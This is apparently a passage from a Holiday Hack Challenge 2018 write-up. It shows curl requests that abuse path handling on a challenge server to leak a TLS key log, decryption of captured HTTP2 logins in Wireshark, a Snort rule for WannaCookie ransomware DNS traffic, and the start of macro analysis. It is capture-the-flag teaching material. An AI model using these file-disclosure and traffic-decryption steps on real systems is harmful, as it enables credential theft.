        <span style="color: #b22222;">// </span><span style="color: #b22222;">This removes any instances of ".." to prevent path traversal attacks</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">e.g. "/dir/../file" -&gt; "/dir//file"</span>
        <span style="color: #a020f0;">while</span> (filename.indexOf(<span style="color: #8b2252;">'..'</span>) &gt; -1) {
            filename = filename.replace(<span style="color: #8b2252;">/\.\./</span>g,<span style="color: #8b2252;">''</span>);
        }

        <span style="color: #b22222;">// </span><span style="color: #b22222;">Only execute if the filename is not 'index.html', 'home.html', or 'register.html'</span>
        <span style="color: #a020f0;">if</span> (![<span style="color: #8b2252;">'index.html'</span>, <span style="color: #8b2252;">'home.html'</span>, <span style="color: #8b2252;">'register.html'</span>].includes(filename)) {
            <span style="color: #b22222;">// </span><span style="color: #b22222;">Build the filename, and set the content type header accordingly</span>
            ctx.set(<span style="color: #8b2252;">'Content-Type'</span>, mime.lookup(__dirname + (process.env[dir] || <span style="color: #8b2252;">'/pub/'</span>) + filename))
            <span style="color: #b22222;">// </span><span style="color: #b22222;">Read the file, and send it as the body</span>
            ctx.body = fs.readFileSync(__dirname + (process.env[dir] || <span style="color: #8b2252;">'/pub/'</span>) + filename)
        }
        <span style="color: #b22222;">// </span><span style="color: #b22222;">For 'index.html', 'home.html', or 'register.html', return a 404 instead.</span>
        <span style="color: #a020f0;">else</span>
        {
            ctx.status = 404;
            ctx.body = <span style="color: #8b2252;">'Not Found'</span>;
        }
    <span style="color: #b22222;">// </span><span style="color: #b22222;">If anything we've tried so far generated an error, return that error as the body</span>
    } <span style="color: #a020f0;">catch</span> (e) {
        ctx.body = e.toString();
    }
});
</pre>
</div>

<p>
Going through this, especially with an example, we can understand
the logic. Sometimes it's useful to try running a command, and
seeing what the output is. In cases like this, we pull up the
Javascript console of our browser's developer tools again:
</p>


<div class="figure">
<p><img src="./imgs/obj8_jsconsole.png" alt="obj8_jsconsole.png" width="500px" />
</p>
<p><span class="figure-number">Figure 43: </span>Testing JS code in our console</p>
</div>

<p>
Our attention is drawn to how the code builds the filename:
</p>

<div class="org-src-container">
<pre class="src src-javascript">ctx.body = fs.readFileSync(__dirname + (process.env[dir] || <span style="color: #8b2252;">'/pub/'</span>) + filename)
</pre>
</div>

<p>
Again, we'll expand this logic out a bit:
</p>

<div class="org-src-container">
<pre class="src src-javascript"><span style="color: #b22222;">// </span><span style="color: #b22222;">e.g. ["pub", "dir", "..", "file"] -&gt; "PUB"</span>
<span style="color: #a020f0;">let</span> <span style="color: #a0522d;">dir</span> = split_path[0].toUpperCase();

<span style="color: #a020f0;">if</span> ( process.env[dir] )
    <span style="color: #a020f0;">var</span> <span style="color: #a0522d;">dir</span> = process.env[dir];
<span style="color: #a020f0;">else</span>
    <span style="color: #a020f0;">var</span> <span style="color: #a0522d;">dir</span> = <span style="color: #8b2252;">'/pub/'</span>;

ctx.body = fs.readFileSync(__dirname + dir + filename)
</pre>
</div>

<p>
So, the first part of our path is upper-cased, and if an
environment variable exists with that name, it attempts to use
that as part of the path to our file. Let's try it. Searching for <code>process.env</code> pulls up some Node.js documentation:
</p>


<div class="figure">
<p><img src="./imgs/obj8_nodedocs.png" alt="obj8_nodedocs.png" width="750px" />
</p>
<p><span class="figure-number">Figure 44: </span>process.env documentation</p>
</div>

<p>
Let's try accessing the <code>PATH</code> environment variable:
</p>

<div class="org-src-container">
<pre class="src src-sh">$ curl -s <span style="color: #8b2252;">'https://packalyzer.kringlecastle.com/path/file'</span>
Error: ENOENT: no such file or directory, open <span style="color: #8b2252;">'/opt/http2/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin/file'</span>
</pre>
</div>

<p>
We received an error message, but one which discloses some
information. Let's try to unpack this, given that we have the
source for how the filename was built. First, let's identify exactly which part is our <code>PATH</code>. We can check this on a Cranberry Pi terminal, as a point of comparison:
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@cranpi:~$ echo $<span style="color: #a0522d;">PATH</span>
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
</pre>
</div>

<p>
Reading our error message carefully, we can identify all three variables that combined to form the filename:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Value</th>
<th scope="col" class="org-left">Variable</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left"><code>/opt/http2</code></td>
<td class="org-left"><code>__dirname</code></td>
</tr>

<tr>
<td class="org-left"><code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code></td>
<td class="org-left"><code>process.env[dir] (PATH)</code></td>
</tr>

<tr>
<td class="org-left"><code>/file</code></td>
<td class="org-left"><code>filename</code></td>
</tr>
</tbody>
</table>

<p>
At this point, we need to recover the environment variables <code>DEV</code>
and <code>SSLKEYLOGFILE</code>, which are referenced in <code>key_log_path =
    __dirname + process.env.DEV + process.env.SSLKEYLOGFILE )</code>:
</p>

<div class="org-src-container">
<pre class="src src-sh">$ curl -s <span style="color: #8b2252;">'https://packalyzer.kringlecastle.com/dev/file'</span>
Error: ENOENT: no such file or directory, open <span style="color: #8b2252;">'/opt/http2/dev//file'</span>
$ curl -s <span style="color: #8b2252;">'https://packalyzer.kringlecastle.com/sslkeylogfile/file'</span>
Error: ENOENT: no such file or directory, open <span style="color: #8b2252;">'/opt/http2packalyzer_clientrandom_ssl.log/file'</span>
</pre>
</div>

<p>
From this, we can deduce that <code>DEV</code> is <code>/dev/</code> and <code>SSLKEYLOGFILE</code>
is <code>packalyzer_clientrandom_ssl.log</code>. We've already figured out
<code>__dirname</code>, so our <code>key_log_path</code> would've been
<code>/opt/http2/dev/packalyzer_clientrandom_ssl.log</code>. We just need to
figure out how to access that via the webserver. We've already
noted that we can access files from
<a href="https://packalyzer.kringlecastle.com/pub/">https://packalyzer.kringlecastle.com/pub/</a>, so let's get the full
path of that by generating an error message for a non-existant
file:
</p>

<div class="org-src-container">
<pre class="src src-sh">curl -s <span style="color: #8b2252;">'https://packalyzer.kringlecastle.com/pub/passwords'</span>
Error: ENOENT: no such file or directory, open <span style="color: #8b2252;">'/opt/http2/pub//passwords'</span>
</pre>
</div>

<p>
Great! The files we're accessing are from <code>/opt/http2/pub</code>, so <code>/opt/http2/dev</code> should be just as easy to access:
</p>

<div class="org-src-container">
<pre class="src src-sh">$ curl -sv -o packalyzer_clientrandom_ssl.log <span style="color: #8b2252;">'https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log'</span>
...
&lt; HTTP/2 200
&lt; set-cookie: <span style="color: #a0522d;">PASESSION</span>=6184281170062926003382193748323381
&lt; content-type: text/plain
&lt; content-length: 38896
&lt; date: Sun, 13 Jan 2019 17:32:29 GMT
&lt;
{ [16384 bytes data]
</pre>
</div>

<p>
Great! We've successfully downloaded the file.
</p>
</div>
</div>
<div id="outline-container-org446c7dc" class="outline-4">
<h4 id="org446c7dc">Solution Part 2: Decrypting the Traffic</h4>
<div class="outline-text-4" id="text-org446c7dc">
<p>
We've run through most of SugarPlum's hints in order to recover the SSL Key Logfile. As a reminder, she also told us:
</p>

<blockquote>
<p>
I'm hoping these errors can't be used to compromise SSL on the website and steal logins.
</p>

<p>
On a tooootally unrelated note, have you seen the HTTP2 talk at at
KringleCon by the Chrises? I never knew HTTP2 was so different!
</p>
</blockquote>

<p>
We already used Chris Elgee's video for the CURLing Master
terminal, and it made no mention of using HTTP2 to compromise
SSL. The other video is <a href="https://www.youtube.com/watch?v=YHOnxlQ6zec">Chris Davis, HTTP/2: Decryption and
Analysis in Wireshark</a>, which sounds perfect.
</p>

<p>
The first part of the talk discusses how to create the SSL Key
Logfile using curl and Chrome. This seems like what we just
recovered from the system, only that it was generated server-side
instead of client-side. The talk also mentions how we can use this
file to decrypt the SSL traffic in Wireshark. In order to do that, we
need a <abbr title="Packet Capture"> PCAP</abbr>, though. Perhaps a new
<abbr title="Packet Capture"> PCAP</abbr> from the Packalyzer web
interface?
</p>

<p>
The comment in the server-side source code warned us that the key
log only stores a few minutes worth at a time. The server can't log keys ahead of time, so our workflow should be:
</p>

<ol class="org-ol">
<li>Sniff traffic on Packalyzer, to generate a new <abbr title="Packet Capture"> PCAP</abbr>.</li>
<li>Download the SSL key logfile</li>
<li>Download the capture</li>
<li>Attempt to decrypt the SSL traffic in the capture with the key logfile.</li>
</ol>

<p>
For step 4, we just continue following along with Chris's
video. First, we configure the Wireshark SSL protocol analyzer to
use our freshly downloaded key logfile:
</p>


<div class="figure">
<p><img src="./imgs/obj8_wireshark_config.png" alt="obj8_wireshark_config.png" width="750px" />
</p>
<p><span class="figure-number">Figure 45: </span>Configuring Wireshark SSL protocol analyzer</p>
</div>

<p>
It worked! We can now see some HTTP2 traffic:
</p>


<div class="figure">
<p><img src="./imgs/obj8_wireshark_traffic.png" alt="obj8_wireshark_traffic.png" width="500px" />
</p>
<p><span class="figure-number">Figure 46: </span>Wireshark HTTP2 overview</p>
</div>

<p>
As a reminder, our goal is to steal logins, and ultimately access
a document sent from Holly to Alabaster. To start, we'll filter
out just HTTP2 traffic, using the <code>http2</code> display filter:
</p>


<div class="figure">
<p><img src="./imgs/obj8_wireshark_http2.png" alt="obj8_wireshark_http2.png" width="500px" />
</p>
<p><span class="figure-number">Figure 47: </span>Wireshark with http2 filter</p>
</div>

<p>
We immediately see a HTTP <code>POST</code> request to <code>/api/login</code>, which
seems promising. Chris's video has a very similar request, and he
points out that to get the actual username and password, we need
to look at a different frame in the packet capture. We'll combine
two of Chris's example filters into <code>http2.header.value == "POST" or http2.data.data</code>, and then we can find some credentials:
</p>


<div class="figure">
<p><img src="./imgs/obj8_wireshark_pepper_creds.png" alt="obj8_wireshark_pepper_creds.png" width="500px" />
</p>
<p><span class="figure-number">Figure 48: </span>Wireshark with http2 POST filter</p>
</div>

<p>
We've found Pepper's credentials. Can we find anyone else's? To
speed up this analysis a bit, we're going to add some custom
fields to the Wireshark display. Either by right-clicking on the column headers and going to <code>Column Preferences...</code> or by going to <code>Preferences</code> &rarr; <code>Appearance</code> &rarr; <code>Columns</code>. We'll add two custom columns for JSON keys and values:
</p>


<div class="figure">
<p><img src="./imgs/obj8_wireshark_custom_columns.png" alt="obj8_wireshark_custom_columns.png" width="500px" />
</p>
<p><span class="figure-number">Figure 49: </span>Wireshark custom columns</p>
</div>

<p>
Finally, we'll filter our <abbr title="Packet Capture"> PCAP</abbr> to display frames which have a JSON key of "password":
</p>


<div class="figure">
<p><img src="./imgs/obj8_wireshark_creds.png" alt="obj8_wireshark_creds.png" width="750px" />
</p>
<p><span class="figure-number">Figure 50: </span>Wireshark with json filter</p>
</div>

<p>
Bingo!
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Username</th>
<th scope="col" class="org-left">Password</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">pepper</td>
<td class="org-left">Shiz-Bamer_wabl182</td>
</tr>

<tr>
<td class="org-left">alabaster</td>
<td class="org-left">Packer-p@re-turntable192</td>
</tr>
</tbody>
</table>

<p>
We've followed all the hints, but ultimately, we're looking for a
document. The HTTP2 traffic we're seeing in this <abbr title="Packet
    Capture"> PCAP</abbr> looks like the Packalyzer website itself, so
we're presuming the credentials are for that. Since we know the
document was sent to Alabaster, let's start with his credentials,
and try logging into Packalyzer:
</p>


<div class="figure">
<p><img src="./imgs/obj8_alabaster_login.png" alt="obj8_alabaster_login.png" width="500px" />
</p>
<p><span class="figure-number">Figure 51: </span>Successful login as Alabaster</p>
</div>

<p>
Opening up the captures associated with Alabaster's account, we
find the tantalizingly named <code>super_secret_packet_capture.pcap</code>. We'll grab it and open it up in Wireshark again. A good way to get a quick overview of a <abbr title="Packet Capture"> PCAP</abbr> in Wireshark is to use <code>Statistics</code> &rarr; <code>Protocol Hierarchy</code>:
</p>


<div class="figure">
<p><img src="./imgs/obj8_super_secret_hierarchy.png" alt="obj8_super_secret_hierarchy.png" width="750px" />
</p>
<p><span class="figure-number">Figure 52: </span>Super secret protocol hierarchy</p>
</div>

<p>
It looks like the only thing Wireshark found in this
<abbr title="Packet Capture"> PCAP</abbr> is <abbr title="Simple Message
    Transfer Protocol"> SMTP</abbr> (e-mail) traffic. Note that it's not
listed as 100%, since some packets are simply TCP control packets. We'll filter on <code>smtp</code>:
</p>


<div class="figure">
<p><img src="./imgs/obj8_super_secret_smtp.png" alt="obj8_super_secret_smtp.png" />
</p>
<p><span class="figure-number">Figure 53: </span>Super secret SMTP</p>
</div>

<p>
We immediately see an e-mail from Holly to Alabaster. Looks like
we're on the right track&#x2026; Now we just need to find and extract
the document. To get a better look at the data, we can right click
on one of the frames, and select <code>Follow</code> &rarr; <code>TCP Stream</code>. A
new window pops up:
</p>


<div class="figure">
<p><img src="./imgs/obj8_super_secret_email.png" alt="obj8_super_secret_email.png" width="500px" />
</p>
<p><span class="figure-number">Figure 54: </span>Super secret e-mail</p>
</div>

<p>
Holly says:
</p>

<blockquote>
<p>
Hey alabaster, 
</p>

<p>
Santa said you needed help understanding musical notes for accessing
the vault. He said your favorite key was D. Anyways, the following
attachment should give you all the information you need about
transposing music.
</p>
</blockquote>

<p>
What follows is the attachment:
</p>

<pre class="example">
------=_MIME_BOUNDARY_000_11181
Content-Type: application/octet-stream
Content-Transfer-Encoding: BASE64
Content-Disposition: attachment

JVBERi0xLjUKJb/3ov4KOCAwIG9iago8PCAvTGluZWFyaXplZCAxIC9MIDk3ODMxIC9IIFsgNzM4
IDE0MCBdIC9PIDEyIC9FIDc3MzQ0IC9OIDIgL1QgOTc1MTcgPj4KZW5kb2JqCiAgICAgICAgICAg
</pre>

<p>
We can see that the attachment is encoded as base64, so we can copy and paste the data, and then decode it with:
</p>

<div class="org-src-container">
<pre class="src src-sh">$ cat obj8_attachment.b64 | base64 --decode &gt; obj8_attachment
$ file obj8_attachment
obj8_attachment: PDF document, version 1.5
$ mv obj8_attachment obj8_attachment.pdf
</pre>
</div>

<p>
The attachment is a PDF, so we'll rename it accordingly. Opening the document gives us our answer:
</p>


<div class="figure">
<p><img src="./imgs/obj8_solution.png" alt="obj8_solution.png" width="750px" />
</p>
<p><span class="figure-number">Figure 55: </span>Super secret song</p>
</div>

<p>
<b>Answer</b>:
</p>
<div class="note">
<p>
Mary Had a Little Lamb
</p>

</div>

<p>
We also note that this document walks us through how to transcribe a song from one key to another.
</p>
</div>
</div>
</div>

<div id="outline-container-org3ac6271" class="outline-3">
<h3 id="obj9"><a id="org3ac6271"></a>Ransomware Recovery</h3>
<div class="outline-text-3" id="text-obj9">
<div id="text-table-of-contents">
<ul>
<li><a href="#orgf2d04e7">Goal</a></li>
<li><a href="#org1c55408">Background</a></li>
<li><a href="#obj91">Phase 1: Catch the Malware</a></li>
<li><a href="#obj92">Phase 2: Identify the Domain</a></li>
<li><a href="#obj93">Phase 3: Stop the Malware</a></li>
<li><a href="#obj94">Phase 4: Recover Alabaster's Password</a></li>
</ul>
</div>
</div>
<div id="outline-container-orgf2d04e7" class="outline-4">
<h4 id="orgf2d04e7">Goal</h4>
<div class="outline-text-4" id="text-orgf2d04e7">
<div class="note">
<p>
Alabaster Snowball is in dire need of your help. Santa's file
server has been hit with malware. Help Alabaster Snowball deal
with the malware on Santa's server by completing several tasks.
</p>

</div>
</div>
</div>
<div id="outline-container-org1c55408" class="outline-4">
<h4 id="org1c55408">Background</h4>
<div class="outline-text-4" id="text-org1c55408">
</div>
<ul class="org-ul">
<li><a id="orga3113b0"></a>Location<br />
<div class="outline-text-5" id="text-orga3113b0">
<p>
To access these challenges, you need to have gotten access to
Santa's Secret Room, either by bypassing the QR code
Scan-O-Matic, or by crawling through the vents.
</p>
</div>
</li>
<li><a id="orgca69f85"></a>Terminal Challenge<br />
<div class="outline-text-5" id="text-orgca69f85">
<div class="tip">
<p>
For hints on achieving this objective, please visit Shinny Upatree and help him with the Sleigh Bell Lottery Cranberry Pi terminal challenge.
</p>

</div>
</div>
</li>
<li><a id="orgc250a98"></a>Badge Hint<br />
<div class="outline-text-5" id="text-orgc250a98">
<p>
Once we help Shinny win the Sleigh Bell Lottery, he gives us several hints. As this grand challenge is really a multi-part exercise, we'll break it down by question.
</p>
</div>
</li>
</ul>
</div>
<div id="outline-container-org1304c27" class="outline-4">
<h4 id="obj91"><a id="org1304c27"></a>Phase 1: Catch the Malware</h4>
<div class="outline-text-4" id="text-obj91">
</div>
<ul class="org-ul">
<li><a id="org15db787"></a>Goal<br />
<div class="outline-text-5" id="text-org15db787">
<div class="note">
<p>
Assist Alabaster by building a Snort filter to identify the malware plaguing Santa's Castle.
</p>

</div>
</div>
</li>
<li><a id="orgeb38350"></a>Background<br />
<div class="outline-text-5" id="text-orgeb38350">
<p>
In Santa's secret room, we find a few terminals and Alabaster Snowball. Alabaster asks us for help:
</p>

<blockquote>
<p>
Help, all of our computers have been encrypted by ransomware!
</p>

<p>
I came here to help but got locked in 'cause I dropped my "Alabaster Snowball" badge in a rush.
</p>

<p>
I started analyzing the ransomware on my host operating system, ran it by accident, and now my files are encrypted!
</p>

<p>
Unfortunately, the password database I keep on my computer was encrypted, so now I don't have access to any of our systems.
</p>

<p>
If only there were some way I could create some kind of traffic filter that could alert anytime ransomware was found!
</p>
</blockquote>

<p>
We launch the Snort Challenge terminal. Opening it up, we see the following message:
</p>

<pre class="example">
INTRO:
  Kringle Castle is currently under attacked by new piece of
  ransomware that is encrypting all the elves files. Your 
  job is to configure snort to alert on ONLY the bad 
  ransomware traffic.

GOAL:
  Create a snort rule that will alert ONLY on bad ransomware
  traffic by adding it to snorts /etc/snort/rules/local.rules
  file. DNS traffic is constantly updated to snort.log.pcap

COMPLETION:
  Successfully create a snort rule that matches ONLY
  bad DNS traffic and NOT legitimate user traffic and the 
  system will notify you of your success.

  Check out ~/more_info.txt for additional information.
</pre>

<p>
Looking at <code>more_info.txt</code>, we see:
</p>

<pre class="example">
MORE INFO:
  A full capture of DNS traffic for the last 30 seconds is 
  constantly updated to:

  /home/elf/snort.log.pcap

  You can also test your snort rule by running:

  snort -A fast -r ~/snort.log.pcap -l ~/snort_logs -c /etc/snort/snort.conf

  This will create an alert file at ~/snort_logs/alert

  This sensor also hosts an nginx web server to access the 
  last 5 minutes worth of pcaps for offline analysis. These 
  can be viewed by logging into:

  http://snortsensor1.kringlecastle.com/

  Using the credentials:
  ----------------------
  Username | elf
  Password | onashelf

  tshark and tcpdump have also been provided on this sensor.

HINT: 
  Malware authors often user dynamic domain names and 
  IP addresses that change frequently within minutes or even 
  seconds to make detecting and block malware more difficult.
  As such, its a good idea to analyze traffic to find patterns
  and match upon these patterns instead of just IP/domains.
</pre>

<p>
To summarize, we need to edit <code>/etc/snort/rules/local.rules</code> and
add a rule to detect the malware, but not alert on legitimate
traffic. To test our rule, we can run <code>snort -A fast -r
     ~/snort.log.pcap -l ~/snort_logs -c /etc/snort/snort.conf</code>.
</p>
</div>
</li>

<li><a id="org482cdc8"></a>Solution<br />
<div class="outline-text-5" id="text-org482cdc8">
<p>
<asciinema-player src="casts/snort.cast" preload="yes" poster="npt:0:03"></asciinema-player>
</p>

<p>
Let's start by taking a look at <code>local.rules</code>:
</p>

<pre class="example">
elf@snort:~$ cat /etc/snort/rules/local.rules
# $Id: local.rules,v 1.11 2004/07/23 20:15:44 bmc Exp $
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
</pre>

<p>
No rules in there yet. Let's check out the DNS traffic and determine what we need to alert on.
</p>

<p>
We're told that we also have a <abbr title="Packet Capture"> PCAP</abbr>
file with 30 seconds of traffic. For digging into the
<abbr title="Packet Capture"> PCAP</abbr>, we can get some hints from <a href="https://www.youtube.com/watch?v=2LRcK9RJADg">Mike
Poor's KringleCon talk</a>. One of the tools mentioned is <code>tshark</code>,
which we're told is on this system. The Snort system doesn't have
manual pages installed, but if we run <code>tshark -h</code>, we see some
useful help output:
</p>

<pre class="example">
elf@snort:~$ tshark -h
TShark (Wireshark) 2.6.4 (Git v2.6.4 packaged as 2.6.4-2~ubuntu16.04.0)
Dump and analyze network traffic.
See https://www.wireshark.org for more information.
Usage: tshark [options] ...
...
Input file:
  -r &lt;infile&gt;              set the filename to read from (- to read from stdin)
</pre>

<p>
Let's just try reading the <abbr title="Packet Capture"> PCAP</abbr>, and see what we're working with:
</p>
<pre class="example">
elf@snort:~$ tshark -r snort.log.pcap 
1   0.000000  10.126.0.31 ? 52.108.236.1 DNS 88 Standard query 0x16ce TXT chases.loliginidae.enshrinement.office.com
2   0.010196 52.108.236.1 ? 10.126.0.31  DNS 151 Standard query response 0x16ce TXT chases.loliginidae.enshrinement.office.com TXT
3   0.020420 10.126.0.189 ? 96.221.202.241 DNS 99 Standard query 0xc933 TXT 77616E6E61636F6F6B69652E6D696E2E707331.bgerushnra.org
4   0.030638 96.221.202.241 ? 10.126.0.189 DNS 167 Standard query response 0xc933 TXT 77616E6E61636F6F6B69652E6D696E2E707331.bgerushnra.org TXT
5   0.040846 10.126.0.191 ? 207.216.8.224 DNS 99 Standard query 0x0fd6 TXT 77616E6E61636F6F6B69652E6D696E2E707331.egrbnahurs.com
6   0.051062 207.216.8.224 ? 10.126.0.191 DNS 167 Standard query response 0x0fd6 TXT 77616E6E61636F6F6B69652E6D696E2E707331.egrbnahurs.com TXT
7   0.061313 10.126.0.191 ? 207.216.8.224 DNS 101 Standard query 0xf013 TXT 0.77616E6E61636F6F6B69652E6D696E2E707331.egrbnahurs.com     
</pre>

<p>
The output of the command is rather verbose, and looks like an intimidating wall of text.
</p>

<p>
We see a number of DNS TXT queries (<code>Standard query 0x.... TXT</code>)
and responses (<code>Standard query response 0x.... TXT</code>). At this
point, we could use standard Linux tools (e.g. <code>grep</code>, <code>cut</code>,
<code>awk</code>) to start analyzing the queries, but <code>tshark</code> can do some
advanced analysis itself. The output format isn't the most
helpful, so by consulting the <a href="https://www.wireshark.org/docs/man-pages/tshark.html">tshark man page</a>, we can create a
command which only shows the DNS query name, and doesn't print
DNS responses (which would cause each query to be printed twice):
</p>

<pre class="example">
tshark -r snort.log.pcap -T fields -e dns.qry.name -Y 'dns.flags.response == 0' 
</pre>

<p>
To make it easier to see what's going on, we can take the above command and pipe it to sort, by appending <code>|sort</code>. Some of the results are:
</p>

<pre class="example">
...
63.77616E6E61636F6F6B69652E6D696E2E707331.rgeubr.net
7.77616E6E61636F6F6B69652E6D696E2E707331.hgerasnrub.com
7.77616E6E61636F6F6B69652E6D696E2E707331.rgeubr.net
77616E6E61636F6F6B69652E6D696E2E707331.hgerasnrub.com
77616E6E61636F6F6B69652E6D696E2E707331.rgeubr.net
8.77616E6E61636F6F6B69652E6D696E2E707331.hgerasnrub.com
8.77616E6E61636F6F6B69652E6D696E2E707331.rgeubr.net
9.77616E6E61636F6F6B69652E6D696E2E707331.hgerasnrub.com
9.77616E6E61636F6F6B69652E6D696E2E707331.rgeubr.net
allsopp.concretized.bronzed.google.co.uk
amixia.reinducing.twitter.com
anthon.loliginidae.myxomata.amazon.com
asked.diddlers.vk.com
...
</pre>

<p>
It seems like we have two types of queries: HEX_DIGITS.suspicious_domain_name and RANDOM_WORDS.well_known_domain_name. Taking it a step further, we notice that the suspicious queries are of the form:
</p>

<pre class="example">
&lt;Optional Number&gt;.77616E6E61636F6F6B69652E6D696E2E707331.&lt;Domain Name&gt;
</pre>

<p>
A closer look at the domain names reveals something interesting&#x2026; <code>rgeubr.net</code> is an anagram for <code>gruber.net</code> and <code>hgerasnrub.com</code> is an anagram for <code>hansgruber.net</code>.
</p>

<p>
What about the <code>776...</code> sequence? We tried decoding it as base64, but that didn't work. It turns out it's just hex-encoded:
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@snort:~$ echo <span style="color: #8b2252;">'77616E6E61636F6F6B69652E6D696E2E707331'</span> | xxd -r -p
wannacookie.min.ps1
</pre>
</div>

<p>
It seems something is querying <code>&lt;chunk&gt;.&lt;wannacookie.min.ps1&gt;.&lt;Hans Gruber's domains&gt;</code>. Certainly looks suspicious&#x2026;
</p>

<p>
We'll start by editing <code>local.rules</code> with the following rule:
</p>

<pre class="example">
alert udp any any &lt;&gt; any 53 ( content:"77616E6E61636F6F6B69652E6D696E2E707331"; )
</pre>

<p>
Our task is to alert on the traffic, so we'll use the <code>alert</code>
keyword. The traffic in the PCAP is destined to a DNS server on
UDP port 53. However, the source IP, source port, and destination
IP all seem random. So we'll use "any any" for the source IP and
port, and "any 53" for the destination IP and port.
</p>

<p>
The <code>&lt;&gt;</code> characters configure our rule to alert on both the
request and response. There are some trade-offs for alerting on
the response (increased false-positive rate, but also an
increased chance to detect compromised hosts).
</p>

<p>
Finally, we're looking for our hex-encoded "wannacookie.min.ps1"
string.
</p>

<p>
Once we add this rule, we get the following message:
</p>

<pre class="example">
[i] Snort is not alerting on all ransomware!
</pre>

<p>
<code>more_info.txt</code> did give us a command line to test our rules, so we can try that:
</p>

<pre class="example">
elf@snort:~$ snort -A fast -r ~/snort.log.pcap -l ~/snort_logs -c /etc/snort/snort.conf 
...
Initializing rule chains...
ERROR: /etc/snort/rules/local.rules(1) Each rule must contain a rule sid.
Fatal Error, Quitting..
</pre>

<p>
Oops. It seems like sids of at least 1,000,000 are reserved for
local rules, so we'll use that. The Snort manual also tells us to
use a revision number in our rule.
</p>

<pre class="example">
alert udp any any &lt;&gt; any 53 ( content:"77616E6E61636F6F6B69652E6D696E2E707331"; sid: 1000000; rev: 1)
</pre>

<p>
With this rule in place, we're told: <code>[+] Congratulation! Snort is alerting on all ransomware and only the ransomware!</code>
</p>

<p>
<b>Answer</b>:
</p>
<div class="note">
<p>
Snort is alerting on all ransomware and only the ransomware
</p>

</div>
</div>

<ul class="org-ul">
<li><a id="orgf8e438b"></a>Refining the Snort rule<br />
<div class="outline-text-6" id="text-orgf8e438b">
<p>
Our rule works, but is not a great rule. Any UDP content that has
that string anywhere in the packet will trigger the rule.
</p>

<p>
DNS uses a special method to encode the query name on the
wire. Each portion of the DNS name (the "labels"), are prefixed
with the length of that label, with an empty label at the
end. So, "www.es.net" would be encoded as
<code>|03|www|02|es|03|net|00|</code>.
</p>

<p>
We can rewrite a better rule as:
</p>

<pre class="example">
alert udp any any &lt;&gt; any 53 ( content:"|26|77616E6E61636F6F6B69652E6D696E2E707331"; msg: "WannaCookie!"; nocase; sid: 1000000; rev: 1)
</pre>

<p>
We're also adding the <code>nocase</code> option, to make our match case-insensitive.
</p>
</div>
</li>
</ul>
</li>
</ul>
</div>

<div id="outline-container-orgab4cb7f" class="outline-4">
<h4 id="obj92"><a id="orgab4cb7f"></a>Phase 2: Identify the Domain</h4>
<div class="outline-text-4" id="text-obj92">
</div>
<ul class="org-ul">
<li><a id="orgeba02b5"></a>Goal<br />
<div class="outline-text-5" id="text-orgeba02b5">
<div class="note">
<p>
Using the Word docm file, identify the domain name that the malware communicates with.
</p>

</div>
</div>
</li>
<li><a id="org5083b14"></a>Background<br />
<ul class="org-ul">
<li><a id="org5018da5"></a>Elf Chat<br />
<div class="outline-text-6" id="text-org5018da5">
<p>
Checking back in with Alabster, he says:
</p>

<blockquote>
<p>
Thank you so much! Snort IDS is alerting on each new ransomware infection in our network.
</p>

<p>
Hey, you're pretty good at this security stuff. Could you help me further with what I suspect is a malicious Word document?
</p>

<p>
All the elves were emailed a cookie recipe right before all the infections. Take this <a href="https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip">document</a> with a password of elves and find the domain it communicates with.
</p>
</blockquote>

<p>
Also, Shinny tells us:
</p>

<blockquote>
<p>
Have you heard that Kringle Castle was hit by a new ransomware called Wannacookie?
</p>

<p>
Several elves reported receiving a cookie recipe Word doc. When opened, a PowerShell screen flashed by and their files were encrypted.
</p>

<p>
Many elves were affected, so Alabaster went to go see if he could help out.
</p>

<p>
I hope Alabaster watched the PowerShell Malware talk at KringleCon before he tried analyzing Wannacookie on his computer.
</p>
</blockquote>
</div>
</li>

<li><a id="org0fa3f74"></a>Badge Hint<br />
<div class="outline-text-6" id="text-org0fa3f74">
<p>
We have the following hints from Shinny and Alabaster:
</p>

<blockquote>
<p>
Whoa, Chris Davis' talk on PowerShell malware is crazy pants! You should check it out!
</p>

<p>
Word docm macros can be extracted using <a href="https://github.com/decalage2/oletools/wiki/olevba">olevba</a>. Perhaps we can use this to grab the ransomware source.
</p>
</blockquote>
</div>
</li>
<li><a id="org77782d8"></a>Relevant KringleCon Videos<br />
<div class="outline-text-6" id="text-org77782d8">
<p>
<a href="https://www.youtube.com/watch?v=wd12XRq2DNk">Chris Davis, Analyzing PowerShell Malware</a>
</p>
</div>
</li>
</ul>
</li>
<li><a id="org0ffc517"></a>Solution<br />
<div class="outline-text-5" id="text-org0ffc517">
<p>
Downloading the document, we hit a snag in extracting it. It
seems like <code>unzip</code> and Apple's Archive Viewer don't support the
format. We end up using p7zip, which can successfully extract it
with the password provided, and we find a Word docm file. This
seems to be a macro-enabled document file.
</p>

<p>
Learning from Alabaster's mistake, we're going to watch Chris's video first, and follow along. Chris's following tip seems especially relevant for Alabaster, in hindsight:
</p>

<div class="tip">
<p>
Never run or analyze malware from your host or host environment
</p>

</div>

<p>
After covering some basic Operational Security best practices, Chris starts talking about a malicious Word document, just like the one we were given. The first tool he uses is <code>olevba</code>. Following along:
</p>

<div class="org-src-container">
<pre class="src src-sh">$ olevba CHOCOLATE_CHIP_COOKIE_RECIPE.docm
olevba 0.53.1 - http://decalage.info/python/oletools
Flags        Filename
-----------  -----------------------------------------------------------------
